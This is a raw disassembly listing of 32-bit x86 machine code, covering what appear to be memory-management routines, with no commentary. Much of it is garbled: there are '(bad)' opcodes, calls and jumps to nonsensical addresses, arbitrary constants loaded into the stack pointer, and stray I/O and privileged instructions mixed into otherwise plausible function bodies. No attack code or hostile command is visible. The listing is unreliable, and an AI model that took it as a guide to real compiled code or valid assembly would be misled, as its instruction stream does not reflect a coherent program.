  4049af:	74 f8                	je     0x4049a9
  4049b1:	5d                   	pop    %ebp
  4049b2:	c3                   	ret
  4049b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4049b4:	0d dc 02 3d 00       	or     $0x3d02dc,%eax
  4049b9:	68 ae f3 10 00       	push   $0x10f3ae
  4049be:	37                   	aaa
  4049bf:	0e                   	push   %cs
  4049c0:	2c 0c                	sub    $0xc,%al
  4049c2:	00 37                	add    %dh,(%edi)
  4049c4:	88 4e dc             	mov    %cl,-0x24(%esi)
  4049c7:	02 42 d3             	add    -0x2d(%edx),%al
  4049ca:	52                   	push   %edx
  4049cb:	e8 f0 59 00 00       	call   0x40a3c0
  4049d0:	85 10                	test   %edx,(%eax)
  4049d2:	75 39                	jne    0x404a0d
  4049d4:	a1 dc 02 41 00       	mov    0x4102dc,%eax
  4049d9:	8d 23                	lea    (%ebx),%esp
  4049db:	fc                   	cld
  4049dc:	50                   	push   %eax
  4049dd:	6a 00                	push   $0x0
  4049df:	51                   	push   %ecx
  4049e0:	e8 5b 57 00 00       	call   0x40a140
  4049e5:	f2 c0 74 24 8b 09    	repnz shlb $0x9,-0x75(%esp)
  4049eb:	f2 4e                	repnz dec %esi
  4049ed:	e0 02                	loopne 0x4049f1
  4049ef:	41                   	inc    %ecx
  4049f0:	00 52 50             	add    %dl,0x50(%edx)
  4049f3:	e8 08 ff 21 d6       	call   0xd6624900
  4049f8:	8b 0d dc e9 41 00    	mov    0x41e9dc,%ecx
  4049fe:	85 15 e0 02 41 00    	test   %edx,0x4102e0
  404a04:	51                   	push   %ecx
  404a05:	52                   	push   %edx
  404a06:	e8 4f ff ff b8       	call   0xb940495a
  404a0b:	25 1a 5e 07 44       	and    $0x44075e1a,%eax
  404a10:	5d                   	pop    %ebp
  404a11:	55                   	push   %ebp
  404a12:	0d 90 90 90 90       	or     $0x90909090,%eax
  404a17:	90                   	nop
  404a18:	90                   	nop
  404a19:	90                   	nop
  404a1a:	90                   	nop
  404a1b:	90                   	nop
  404a1c:	90                   	nop
  404a1d:	24 90                	and    $0x90,%al
  404a1f:	90                   	nop
  404a20:	a0 42 02 8c 00       	mov    0x8c0242,%al
  404a25:	84 c0                	test   %al,%al
  404a27:	74 28                	je     0x404a51
  404a29:	fe c8                	dec    %al
  404a2b:	27                   	daa
  404a2c:	d8 02                	fadds  (%edx)
  404a2e:	41                   	inc    %ecx
  404a2f:	00 75 1f             	add    %dh,0x1f(%ebp)
  404a32:	3a dc                	cmp    %ah,%bl
  404a34:	02 41 00             	add    0x0(%ecx),%al
  404a37:	01 e8                	add    %ebp,%eax
  404a39:	c3                   	ret
  404a3a:	03 00                	add    (%eax),%eax
  404a3c:	00 c7                	add    %al,%bh
  404a3e:	05 bd 02 41 e9       	add    $0xe94102bd,%eax
  404a43:	00 00                	add    %al,(%eax)
  404a45:	00 27                	add    %ah,(%edi)
  404a47:	c7 05 d5 02 41 9c 00 	movl   $0x0,0x9c4102d5
  404a4e:	00 00 00 
  404a51:	50                   	push   %eax
  404a52:	90                   	nop
  404a53:	2b 90 90 90 0a 90    	sub    -0x6ff56f70(%eax),%edx
  404a59:	ce                   	into
  404a5a:	90                   	nop
  404a5b:	90                   	nop
  404a5c:	90                   	nop
  404a5d:	96                   	xchg   %eax,%esi
  404a5e:	90                   	nop
  404a5f:	90                   	nop
  404a60:	0f 8b ec 83 ec 0c    	jnp    0xd2cce52
  404a66:	8b 45 3b             	mov    0x3b(%ebp),%eax
  404a69:	8d 56 57             	lea    0x57(%esi),%edx
  404a6c:	8d 50 07             	lea    0x7(%eax),%edx
  404a6f:	83 ac f8 3b d0 8b 45 	subl   $0x8,0x458bd03b(%eax,%edi,8)
  404a76:	08 
  404a77:	89 55 f8             	mov    %edx,-0x8(%ebp)
  404a7a:	73 1d                	jae    0x404a99
  404a7c:	8b 40 20             	mov    0x20(%eax),%eax
  404a7f:	85 c0                	test   %eax,%eax
  404a81:	20 84 46 97 00 00 6a 	and    %al,0x6a000097(%esi,%eax,2)
  404a88:	0c ff                	or     $0xff,%al
  404a8a:	3c 83                	cmp    $0x83,%al
  404a8c:	c4 04 33             	les    (%ebx,%esi,1),%eax
  404a8f:	41                   	inc    %ecx
  404a90:	f5                   	cmc
  404a91:	5e                   	pop    %esi
  404a92:	5b                   	pop    %ebx
  404a93:	8b e5                	mov    %ebp,%esp
  404a95:	5d                   	pop    %ebp
  404a96:	c2 08 00             	ret    $0x8
  404a99:	8b 70 ef             	mov    -0x11(%eax),%esi
  404a9c:	8b 4e 10             	mov    0x10(%esi),%ecx
  404a9f:	8b 7e 14             	mov    0x14(%esi),%edi
  404aa2:	2b db                	sub    %ebx,%ebx
  404aa4:	3b 3b                	cmp    (%ebx),%edi
  404aa6:	77 35                	ja     0x404add
  404aa8:	03 d1                	add    %ecx,%edx
  404aaa:	e2 89                	loop   0x404a35
  404aac:	56                   	push   %esi
  404aad:	6d                   	insl   (%dx),%es:(%edi)
  404aae:	ff 8b c1 5b 6e e5    	decl   -0x1a91a43f(%ebx)
  404ab4:	5d                   	pop    %ebp
  404ab5:	c2 a8 00             	ret    $0xa8
  404ab8:	8b 46 8b             	mov    -0x75(%esi),%eax
  404abb:	4b                   	dec    %ebx
  404abc:	14 8b                	adc    $0x8b,%al
  404abe:	59                   	pop    %ecx
  404abf:	10 c5                	adc    %al,%ch
  404ac1:	fb                   	sti
  404ac2:	3b d7                	cmp    %edi,%edx
  404ac4:	77 14                	ja     0x404ada
  404ac6:	8b 41 04             	mov    0x4(%ecx),%eax
  404ac9:	8b 39                	mov    (%ecx),%edi
  404acb:	89 38                	mov    %edi,(%eax)
  404acd:	8b 01                	mov    (%ecx),%eax
  404acf:	8b 79 38             	mov    0x38(%ecx),%edi
  404ad2:	76 78                	jbe    0x404b4c
  404ad4:	04 e9                	add    $0xe9,%al
  404ad6:	db 01                	fildl  (%ecx)
  404ad8:	c6                   	(bad)
  404ad9:	a0 8b 78 0e 8d       	mov    0x8d0e788b,%al
  404ade:	9a a2 10 00 cd 81 e3 	lcall  $0xe381,$0xcd0010a2
  404ae5:	00 f0                	add    %dh,%al
  404ae7:	ff                   	(bad)
  404ae8:	ff                   	ljmp   (bad)
  404ae9:	ed                   	in     (%dx),%eax
  404aea:	da 89 5d 9b 62 af    	fimull -0x509d64a3(%ecx)
  404af0:	89 01                	mov    %eax,(%ecx)
  404af2:	00 00                	add    %al,(%eax)
  404af4:	81 fb e0 3c 00 00    	cmp    $0x3ce0,%ebx
  404afa:	73 0a                	jae    0x404b06
  404afc:	c7 45 0c 00 20 04 00 	movl   $0x42000,0xc(%ebp)
  404b03:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404b06:	8b d3                	mov    %ebx,%edx
  404b08:	c1 ea 0c             	shr    $0xc,%edx
  404b0b:	fc                   	cld
  404b0c:	83 fa ff             	cmp    $0xffffffff,%edx
  404b0f:	91                   	xchg   %eax,%ecx
  404b10:	55                   	push   %ebp
  404b11:	fc                   	cld
  404b12:	0f 87 a7 01 00 00    	ja     0x404cbf
  404b18:	3b 17                	cmp    (%edi),%edx
  404b1a:	0f 87 85 00 00 00    	ja     0x404ba5
  404b20:	8b 47 0c             	mov    0xc(%edi),%eax
  404b23:	85 c0                	test   %eax,%eax
  404b25:	74 09                	je     0x404b30
  404b27:	50                   	push   %eax
  404b28:	e8 a3 57 4f 00       	call   0x8fa2d0
  404b2d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404b30:	8b 5c 97 7d          	mov    0x7d(%edi,%edx,4),%ebx
  404b34:	8b 5b 8d             	mov    -0x73(%ebx),%ebx
  404b37:	44                   	inc    %esp
  404b38:	2d b8 85 db 75       	sub    $0x75db85b8,%eax
  404b3d:	0f 3b                	(bad)
  404b3f:	d1 73 b8             	shll   $1,-0x48(%ebx)
  404b42:	8b 58 8b             	mov    -0x75(%eax),%ebx
  404b45:	83 c0 79             	add    $0x79,%eax
  404b48:	42                   	inc    %edx
  404b49:	85 58 74             	test   %ebx,0x74(%eax)
  404b4c:	f1                   	int1
  404b4d:	c2 18 85             	ret    $0x8518
  404b50:	db 89 5d f4 74 7f    	fisttpl 0x7f74f45d(%ecx)
  404b56:	8b 1b                	mov    (%ebx),%ebx
  404b58:	85 db                	test   %ebx,%ebx
  404b5a:	89 18                	mov    %ebx,(%eax)
  404b5c:	75 15                	jne    0x404b73
  404b5e:	bc d1 ac 11 8b       	mov    $0x8b11acd1,%esp
  404b63:	50                   	push   %eax
  404b64:	fc                   	cld
  404b65:	83 e8 c2             	sub    $0xffffffc2,%eax
  404b68:	51                   	push   %ecx
  404b69:	85 d2                	test   %edx,%edx
  404b6b:	75 04                	jne    0x404b71
  404b6d:	85 c9                	test   %ecx,%ecx
  404b6f:	77 f1                	ja     0x404b62
  404b71:	89 8d 8b e4 f4 ae    	mov    %ecx,-0x510b1b75(%ebp)
  404b77:	47                   	inc    %edi
  404b78:	08 58 4b             	or     %bl,0x4b(%eax)
  404b7b:	08 03                	or     %al,(%ebx)
  404b7d:	c1 89 47 08 8b c8 8b 	rorl   $0x8b,-0x3774f7b9(%ecx)
  404b84:	47                   	inc    %edi
  404b85:	04 3b                	add    $0x3b,%al
  404b87:	c8 76 03 89          	enter  $0x376,$0x89
  404b8b:	47                   	inc    %edi
  404b8c:	08 8b 7f 0c fb f1    	or     %cl,-0xe04f381(%ebx)
  404b92:	74 06                	je     0x404b9a
  404b94:	57                   	push   %edi
  404b95:	e8 a6 57 00 00       	call   0x40a340
  404b9a:	b7 53                	mov    $0x53,%bh
  404b9c:	18 89 53 10 e9 9a    	sbb    %cl,-0x6516efad(%ecx)
  404ba2:	00 00                	add    %al,(%eax)
  404ba4:	00 8b 47 14 85 8e    	add    %cl,-0x717aebb9(%ebx)
  404baa:	12 c8                	adc    %al,%cl
  404bac:	8b 47 0c             	mov    0xc(%edi),%eax
  404baf:	85 c0                	test   %eax,%eax
  404bb1:	74 7f                	je     0x404c32
  404bb3:	50                   	push   %eax
  404bb4:	e8 17 ff 00 00       	call   0x414ad0
  404bb9:	8b 5f 14             	mov    0x14(%edi),%ebx
  404bbc:	8d 47 a4             	lea    -0x5c(%edi),%eax
  404bbf:	85 db                	test   %ebx,%ebx
  404bc1:	74 12                	je     0x404bd5
  404bc3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404bc6:	19 5b 34             	sbb    %ebx,0x34(%ebx)
  404bc9:	40                   	inc    %eax
  404bca:	ca 76 46             	lret   $0x4676
  404bcd:	8b 40 8b             	mov    -0x75(%eax),%eax
  404bd0:	1b 4f db             	sbb    -0x25(%edi),%ecx
  404bd3:	75 ee                	jne    0x404bc3
  404bd5:	8b 7f 0c             	mov    0xc(%edi),%edi
  404bd8:	85 ff                	test   %edi,%edi
  404bda:	ae                   	scas   %es:(%edi),%al
  404bdb:	06                   	push   %es
  404bdc:	57                   	push   %edi
  404bdd:	e8 5e 57 00 00       	call   0x40a340
  404be2:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404be5:	53                   	push   %ebx
  404be6:	ff 15 5c 5f 40 00    	call   *0x405f5c
  404bec:	83 c4 04             	add    $0x4,%esp
  404bef:	85 bd 0f e1 c5 00    	test   %edi,0xc5e10f(%ebp)
  404bf5:	00 00                	add    %al,(%eax)
  404bf7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404bfa:	8d 48 18             	lea    0x18(%eax),%ecx
  404bfd:	89 89 08 8d 14 18    	mov    %ecx,0x18148d08(%ecx)
  404c03:	77 18                	ja     0x404c1d
  404c05:	10 c7                	adc    %al,%bh
  404c07:	00 00                	add    %al,(%eax)
  404c09:	00 4c 00 89          	add    %cl,-0x77(%eax,%eax,1)
  404c0d:	50                   	push   %eax
  404c0e:	14 8b                	adc    $0x8b,%al
  404c10:	c8 eb 34 8b          	enter  $0x34eb,$0x8b
  404c14:	13 89 10 8b b4 08    	adc    0x8b48b10(%ecx),%ecx
  404c1a:	8b 8c 32 03 cc 8b 47 	mov    0x478bcc03(%edx,%esi,1),%ecx
  404c21:	04 3b                	add    $0x3b,%al
  404c23:	c8 89 4f 08          	enter  $0x4f89,$0x8
  404c27:	76 03                	jbe    0x404c2c
  404c29:	89 6a 08             	mov    %ebp,0x8(%edx)
  404c2c:	12 7f 0c             	adc    0xc(%edi),%bh
  404c2f:	d9 ff                	fcos
  404c31:	74 ec                	je     0x404c1f
  404c33:	57                   	push   %edi
  404c34:	e8 07 57 00 3f       	call   0x3f40a340
  404c39:	8d 4b 18             	lea    0x18(%ebx),%ecx
  404c3c:	89 4b 10             	mov    %ecx,0x10(%ebx)
  404c3f:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  404c45:	12 cb                	adc    %bl,%cl
  404c47:	8b 55 8d             	mov    -0x73(%ebp),%edx
  404c4a:	8b 41 10             	mov    0x10(%ecx),%eax
  404c4d:	c7                   	(bad)
  404c4e:	74 0c                	je     0x404c5c
  404c50:	b5 00                	mov    $0x0,%ch
  404c52:	16                   	push   %ss
  404c53:	3f                   	aas
  404c54:	e1 12                	loope  0x404c68
  404c56:	89 de                	mov    %ebx,%esi
  404c58:	10 8b 56 04 89 51    	adc    %cl,0x51890456(%ebx)
  404c5e:	6b 89 0a 8b 55 08 89 	imul   $0xffffff89,0x8558b0a(%ecx),%ecx
  404c65:	31 89 4e 04 89 38    	xor    %ecx,0x3889044e(%ecx)
  404c6b:	2c a3                	sub    $0xa3,%al
  404c6d:	4e                   	dec    %esi
  404c6e:	14 8b                	adc    $0x8b,%al
  404c70:	7e 10                	jle    0x404c82
  404c72:	2b cf                	sub    %edi,%ecx
  404c74:	8b 71 81             	mov    -0x7f(%ecx),%esi
  404c77:	4e                   	dec    %esi
  404c78:	00 10                	add    %dl,(%eax)
  404c7a:	00 00                	add    %al,(%eax)
  404c7c:	8b d7                	mov    %edi,%edx
  404c7e:	81 e1 00 f0 ff ff    	and    $0xfffff000,%ecx
  404c84:	49                   	dec    %ecx
  404c85:	c1 f9 0c             	sar    $0xc,%ecx
  404c88:	b9 4e a5 8b 5a       	mov    $0x5a8ba54e,%ecx
  404c8d:	0c 3b                	or     $0x3b,%al
  404c8f:	cb                   	lret
  404c90:	73 21                	jae    0x404cb3
  404c92:	8b 12                	mov    (%edx),%edx
  404c94:	3b c3                	cmp    %ebx,%eax
  404c96:	25 72 f9 8b 4e       	and    $0x4e8bf972,%eax
  404c9b:	04 4c                	add    $0x4c,%al
  404c9d:	06                   	push   %es
  404c9e:	8b 0e                	mov    (%esi),%ecx
  404ca0:	8b 7e 04             	mov    0x4(%esi),%edi
  404ca3:	89 79 04             	mov    %edi,0x4(%ecx)
  404ca6:	8b 4a 04             	mov    0x4(%edx),%ecx
  404ca9:	89 4e 15             	mov    %ecx,0x15(%esi)
  404cac:	89 31                	mov    %esi,(%ecx)
  404cae:	89 4f 89             	mov    %ecx,-0x77(%edi)
  404cb1:	9d                   	popf
  404cb2:	04 5f                	add    $0x5f,%al
  404cb4:	5e                   	pop    %esi
  404cb5:	5b                   	pop    %ebx
  404cb6:	8b e5                	mov    %ebp,%esp
  404cb8:	5d                   	pop    %ebp
  404cb9:	c2 08 00             	ret    $0x8
  404cbc:	8b 45 08             	mov    0x8(%ebp),%eax
  404cbf:	8b 40 20             	mov    0x20(%eax),%eax
  404cc2:	46                   	inc    %esi
  404cc3:	c0 74 f7 6a 0c       	shlb   $0xc,0x6a(%edi,%esi,8)
  404cc8:	ff d0                	call   *%eax
  404cca:	83 c4 04             	add    $0x4,%esp
  404ccd:	5f                   	pop    %edi
  404cce:	5e                   	pop    %esi
  404ccf:	33 c0                	xor    %eax,%eax
  404cd1:	5b                   	pop    %ebx
  404cd2:	8b e5                	mov    %ebp,%esp
  404cd4:	5d                   	pop    %ebp
  404cd5:	c2 82 00             	ret    $0x82
  404cd8:	22 ce                	and    %dh,%cl
  404cda:	8d 90 90 90 90 70    	lea    0x70909090(%eax),%edx
  404ce0:	55                   	push   %ebp
  404ce1:	4a                   	dec    %edx
  404ce2:	99                   	cltd
  404ce3:	38 15 db 53 56 ac    	cmp    %dl,0xac5653db
  404ce9:	17                   	pop    %ss
  404cea:	7d 08                	jge    0x404cf4
  404cec:	6c                   	insb   (%dx),%es:(%edi)
  404ced:	77 60                	ja     0x404d4f
  404cef:	56                   	push   %esi
  404cf0:	e8 a8 91 00 00       	call   0x40de9d
  404cf5:	8b 79 04             	mov    0x4(%ecx),%edi
  404cf8:	62 db 83             	(bad) {%k4}{z}
  404cfb:	c4 04 3b             	les    (%ebx,%edi,1),%eax
  404cfe:	b9 89 1e 89 5f       	mov    $0x5f891e89,%ecx
  404d03:	3c 74                	cmp    $0x74,%al
  404d05:	0d 50 e8 34 00       	or     $0x34e850,%eax
  404d0a:	c0 fd 8b             	sar    $0x8b,%ch
  404d0d:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0e:	04 3b                	add    $0x3b,%al
  404d10:	c3                   	ret
  404d11:	75 2d                	jne    0x404d40
  404d13:	8d                   	lea    (bad),%ecx
  404d14:	ce                   	into
  404d15:	10 56 e8             	adc    %dl,-0x18(%esi)
  404d18:	0a 2c 00             	or     (%eax,%eax,1),%ch
  404d1b:	00 8b 47 1c 89 89    	add    %cl,-0x7676e3b9(%ebx)
  404d21:	50                   	push   %eax
  404d22:	4f                   	dec    %edi
  404d23:	5f                   	pop    %edi
  404d24:	14 e8                	adc    $0xe8,%al
  404d26:	06                   	push   %es
  404d27:	07                   	pop    %es
  404d28:	00 00                	add    %al,(%eax)
  404d2a:	8b 47 30             	mov    0x30(%edi),%eax
  404d2d:	8b 4f 34             	mov    0x34(%edi),%ecx
  404d30:	42                   	inc    %edx
  404d31:	5f                   	pop    %edi
  404d32:	1c 89                	sbb    $0x89,%al
  404d34:	b3 24                	mov    $0x24,%bl
  404d36:	89 47 07             	mov    %eax,0x7(%edi)
  404d39:	b8 48 10 8b 7c       	mov    $0x7c8b1048,%eax
  404d3e:	83 c4 08             	add    $0x8,%esp
  404d41:	3b 92 89 45 f4 0f    	cmp    0xff44589(%edx),%edx
  404d47:	84 93 b1 00 00 8b    	test   %dl,-0x74ffff4f(%ebx)
  404d4d:	aa                   	stos   %al,%es:(%edi)
  404d4e:	04 db                	add    $0xdb,%al
  404d50:	1a ce                	sbb    %dh,%cl
  404d52:	7f 3c                	jg     0x404d90
  404d54:	8b 30                	mov    (%eax),%esi
  404d56:	8b 06                	mov    (%esi),%eax
  404d58:	0c 85                	or     $0x85,%al
  404d5a:	c0 74 cc 50 e8       	shlb   $0xe8,0x50(%esp,%ecx,8)
  404d5f:	6d                   	insl   (%dx),%es:(%edi)
  404d60:	27                   	daa
  404d61:	00 00                	add    %al,(%eax)
  404d63:	d4 07                	aam    $0x7
  404d65:	90                   	nop
  404d66:	4f                   	dec    %edi
  404d67:	04 8b                	add    $0x8b,%al
  404d69:	57                   	push   %edi
  404d6a:	08 89 45 08 71 4d    	or     %cl,0x4d710845(%ecx)
  404d70:	fc                   	cld
  404d71:	8b b6 bd 4d 5f 02    	mov    0x25f4dbd(%esi),%esi
  404d77:	45                   	inc    %ebp
  404d78:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404d79:	8b 46 08             	mov    0x8(%esi),%eax
  404d7c:	85 c9                	test   %ecx,%ecx
  404d7e:	74 0a                	je     0x404d8a
  404d80:	3b c2                	cmp    %edx,%eax
  404d82:	76 06                	jbe    0x404d8a
  404d84:	89 c0                	mov    %eax,%eax
  404d86:	8b de                	mov    %esi,%ebx
  404d88:	eb 2f                	jmp    0x404db9
  404d8a:	83 f8 14             	cmp    $0x14,%eax
  404d8d:	73 18                	jae    0x404da7
  404d8f:	0e                   	push   %cs
  404d90:	4c                   	dec    %esp
  404d91:	87 14 85 c9 89 0e e3 	xchg   %edx,-0x1cf17637(,%eax,4)
  404d98:	08 3b                	or     %bh,(%ebx)
  404d9a:	45                   	inc    %ebp
  404d9b:	08 76 03             	or     %dh,0x3(%esi)
  404d9e:	a2 45 65 89 74       	mov    %al,0x74896545
  404da3:	87 14 eb             	xchg   %edx,(%ebx,%ebp,8)
  404da6:	08 8b 4f 14 89 0e    	or     %cl,0xe89144f(%ebx)
  404dac:	89 77 14             	mov    %esi,0x14(%edi)
  404daf:	42                   	inc    %edx
  404db0:	d0 72 b2             	shlb   $1,-0x4e(%edx)
  404db3:	2b b5 eb 02 33 d2    	sub    -0x2dccfd15(%ebp),%esi
  404db9:	8b 75 f8             	mov    -0x8(%ebp),%esi
  404dbc:	ec                   	in     (%dx),%al
  404dbd:	f6 75 b1             	divb   -0x4f(%ebp)
  404dc0:	8b 45 08             	mov    0x8(%ebp),%eax
  404dc3:	89 57 f5             	mov    %edx,-0xb(%edi)
  404dc6:	89 07                	mov    %eax,(%edi)
  404dc8:	8b 7f 0c             	mov    0xc(%edi),%edi
  404dcb:	85 ff                	test   %edi,%edi
  404dcd:	74 06                	je     0x404dd5
  404dcf:	57                   	push   %edi
  404dd0:	05 35 55 00 a6       	add    $0xa6005535,%eax
  404dd5:	85 db                	test   %ebx,%ebx
  404dd7:	74 14                	je     0x404ded
  404dd9:	3e 8c 1c 84          	mov    %ds,%ds:(%esp,%eax,4)
  404ddd:	dd 00                	fldl   (%eax)
  404ddf:	8b c3                	mov    %ebx,%eax
  404de1:	8b 1b                	mov    (%ebx),%ebx
  404de3:	50                   	push   %eax
  404de4:	d8 d6                	fcom   %st(6)
  404de6:	83 c4 f9             	add    $0xfffffff9,%esp
  404de9:	85 db                	test   %ebx,%ebx
  404deb:	e7 f2                	out    %eax,$0xf2
  404ded:	58                   	pop    %eax
  404dee:	45                   	inc    %ebp
  404def:	82 89 00 89 40 04 5f 	orb    $0x5f,0x4408900(%ecx)
  404df6:	5e                   	pop    %esi
  404df7:	5b                   	pop    %ebx
  404df8:	8b e5                	mov    %ebp,%esp
  404dfa:	5d                   	pop    %ebp
  404dfb:	c2 04 24             	ret    $0x2404
  404dfe:	90                   	nop
  404dff:	90                   	nop
  404e00:	55                   	push   %ebp
  404e01:	8b ec                	mov    %esp,%ebp
  404e03:	83 ec 0c             	sub    $0xc,%esp
  404e06:	3a 8b 5d 08 56 57    	cmp    0x5756085d(%ebx),%cl
  404e0c:	c2 73 38             	ret    $0x3873
  404e0f:	56                   	push   %esi
  404e10:	e8 db 08 00 00       	call   0x4056f0
  404e15:	8b 30                	mov    (%eax),%esi
  404e17:	04 83                	add    $0x83,%al
  404e19:	c4 04 85 c0 c7 06 16 	les    0x1606c7c0(,%eax,4),%eax
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 c7                	add    %al,%bh
  404e24:	43                   	inc    %ebx
  404e25:	c6 00 00             	movb   $0x0,(%eax)
  404e28:	b4 8f                	mov    $0x8f,%ah
  404e2a:	74 0d                	je     0x404e39
  404e2c:	48                   	dec    %eax
  404e2d:	e8 ce ff ff ff       	call   0x404e00
  404e32:	8b 43 be             	mov    -0x42(%ebx),%eax
  404e35:	85 c0                	test   %eax,%eax
  404e37:	75 f3                	jne    0x404e2c
  404e39:	8d 43 6b             	lea    0x6b(%ebx),%eax
  404e3c:	04 e8                	add    $0xe8,%al
  404e3e:	ae                   	scas   %es:(%edi),%al
  404e3f:	08 00                	or     %al,(%eax)
  404e41:	fa                   	cli
  404e42:	8b 4b 04             	mov    0x4(%ebx),%ecx
  404e45:	51                   	push   %ecx
  404e46:	e8 e5 08 00 00       	call   0x405730
  404e4b:	8b 03                	mov    (%ebx),%eax
  404e4d:	83 c4 08             	add    $0x8,%esp
  404e50:	26 c0 9b 20 f2 50 18 	rcrb   $0xf5,%es:0x1850f220(%ebx)
  404e57:	f5 
  404e58:	e8 b3 fa ff 8b       	call   0x8c404910
  404e5d:	8b ba 85 f6 74 06    	mov    0x674f685(%edx),%edi
  404e63:	56                   	push   %esi
  404e64:	e8 36 54 00 00       	call   0x40a29f
  404e69:	8b 43 0c             	mov    0xc(%ebx),%eax
  404e6c:	8b 4b 08             	mov    0x8(%ebx),%ecx
  404e6f:	33 77 8b             	xor    -0x75(%edi),%esi
  404e72:	43                   	inc    %ebx
  404e73:	0c 1c                	or     $0x1c,%al
  404e75:	38 00                	cmp    %al,(%eax)
  404e77:	74 06                	je     0x404e7f
  404e79:	8b 53 08             	mov    0x8(%ebx),%edx
  404e7c:	5b                   	pop    %ebx
  404e7d:	42                   	inc    %edx
  404e7e:	0c 85                	or     $0x85,%al
  404e80:	f6 a0 06 56 e1 b7    	mulb   -0x481ea9fa(%eax)
  404e86:	f5                   	cmc
  404e87:	00 00                	add    %al,(%eax)
  404e89:	8b 73 30             	mov    0x30(%ebx),%esi
  404e8c:	8b 7b 18             	mov    0x18(%ebx),%edi
  404e8f:	57                   	push   %edi
  404e90:	8b 46 06             	mov    0x6(%esi),%eax
  404e93:	c7 00 00 00 00 3f    	movl   $0x3f000000,(%eax)
  404e99:	e8 92 fa ff ff       	call   0x404930
  404e9e:	3b 6f 75             	cmp    0x75(%edi),%ebp
  404ea1:	c8 ad 00 57          	enter  $0xad,$0x57
  404ea5:	e8 56 f4 ff ff       	call   0x404300
  404eaa:	8b cb                	mov    %ebx,%ecx
  404eac:	0c 33                	or     $0x33,%al
  404eae:	db 63 f3             	(bad) -0xd(%ebx)
  404eb1:	be 06 50 e8 17       	mov    $0x17e85006,%esi
  404eb6:	4c                   	dec    %esp
  404eb7:	00 00                	add    %al,(%eax)
  404eb9:	8b 57 04             	mov    0x4(%edi),%edx
  404ebc:	8b 8a ef 55 c3 8b    	mov    -0x743caa11(%edx),%ecx
  404ec2:	57                   	push   %edi
  404ec3:	08 89 4d 25 8b 06    	or     %cl,0x68b254d(%ecx)
  404ec9:	8b 4d 35             	mov    0x35(%ebp),%ecx
  404ecc:	89 45 11             	mov    %eax,0x11(%ebp)
  404ecf:	8b 46 08             	mov    0x8(%esi),%eax
  404ed2:	85 c9                	test   %ecx,%ecx
  404ed4:	74 0a                	je     0x404ee0
  404ed6:	3b 63 76             	cmp    0x76(%ebx),%esp
  404ed9:	06                   	push   %es
  404eda:	89 9a a5 d0 eb 61    	mov    %ebx,0x61ebd0a5(%edx)
  404ee0:	83 f8 14             	cmp    $0x14,%eax
  404ee3:	39 d8                	cmp    %ebx,%eax
  404ee5:	4c                   	dec    %esp
  404ee6:	4c                   	dec    %esp
  404ee7:	87 14 85 c9 89 0e 75 	xchg   %edx,0x750e89c9(,%eax,4)
  404eee:	08 3b                	or     %bh,(%ebx)
  404ef0:	0b fc                	or     %esp,%edi
  404ef2:	76 37                	jbe    0x404f2b
  404ef4:	12 45 fc             	adc    -0x4(%ebp),%al
  404ef7:	89 74 87 14          	mov    %esi,0x14(%edi,%eax,4)
  404efb:	eb 08                	jmp    0x404f05
  404efd:	66 4f                	dec    %di
  404eff:	14 89                	adc    $0x89,%al
  404f01:	0e                   	push   %cs
  404f02:	89 77 14             	mov    %esi,0x14(%edi)
  404f05:	3b d0                	cmp    %eax,%edx
  404f07:	32 04 2b             	xor    (%ebx,%ebp,1),%al
  404f0a:	d0 eb                	shr    $1,%bl
  404f0c:	02 33                	add    (%ebx),%dh
  404f0e:	d2 8b e8 40 85 f6    	rorb   %cl,-0x97abf18(%ebx)
  404f14:	75 b1                	jne    0x404ec7
  404f16:	8b 45 d2             	mov    -0x2e(%ebp),%eax
  404f19:	89 57 08             	mov    %edx,0x8(%edi)
  404f1c:	89 07                	mov    %eax,(%edi)
  404f1e:	18 47 0c             	sbb    %al,0xc(%edi)
  404f21:	85 c0                	test   %eax,%eax
  404f23:	9c                   	pushf
  404f24:	06                   	push   %es
  404f25:	50                   	push   %eax
  404f26:	e8 15 54 00 21       	call   0x2140a340
  404f2b:	85 db                	test   %ebx,%ebx
  404f2d:	74 14                	je     0x404f43
  404f2f:	8b 53 30             	mov    0x30(%ebx),%edx
  404f32:	c1 40 00 12          	roll   $0x12,0x0(%eax)
  404f36:	c3                   	ret
  404f37:	8b 7f 06             	mov    0x6(%edi),%edi
  404f3a:	ff d6                	call   *%esi
  404f3c:	83 c4 82             	add    $0xffffff82,%esp
  404f3f:	85 db                	test   %ebx,%ebx
  404f41:	75 f2                	jne    0x404f35
  404f43:	57                   	push   %edi
  404f44:	ea e7 e3 d8 ff 3b 45 	ljmp   $0x453b,$0xffd8e3e7
  404f4b:	08 75 06             	or     %dh,0x6(%ebp)
  404f4e:	57                   	push   %edi
  404f4f:	e8 5c 84 94 ff       	call   0xffd4d3b0
  404f54:	5f                   	pop    %edi
  404f55:	3b 5b 55             	cmp    0x55(%ebx),%ebx
  404f58:	e5 b1                	in     $0xb1,%eax
  404f5a:	f2 04 00             	repnz add $0x0,%al
  404f5d:	90                   	nop
  404f5e:	90                   	nop
  404f5f:	f4                   	hlt
  404f60:	55                   	push   %ebp
  404f61:	8b 42 8b             	mov    -0x75(%edx),%eax
  404f64:	2a 08                	sub    (%eax),%cl
  404f66:	71 00                	jno    0x404f68
  404f68:	00 b8 00 00 8b 45    	add    %bh,0x458b0000(%eax)
  404f6e:	0c 85                	or     $0x85,%al
  404f70:	fc                   	cld
  404f71:	75 0b                	jne    0x404f7e
  404f73:	8b 0d dc 02 41 00    	mov    0x4102dc,%ecx
  404f79:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404f7a:	4d                   	dec    %ebp
  404f7b:	0c 2f                	or     $0x2f,%al
  404f7d:	ab                   	stos   %eax,%es:(%edi)
  404f7e:	8b 68 10             	mov    0x10(%eax),%ebp
  404f81:	85 c9                	test   %ecx,%ecx
  404f83:	75 0a                	jne    0x404f8f
  404f85:	85 a6 74 06 8b 50    	test   %esp,0x508b0674(%esi)
  404f8b:	20 e6                	and    %ah,%dh
  404f8d:	55                   	push   %ebp
  404f8e:	10 13                	adc    %dl,(%ebx)
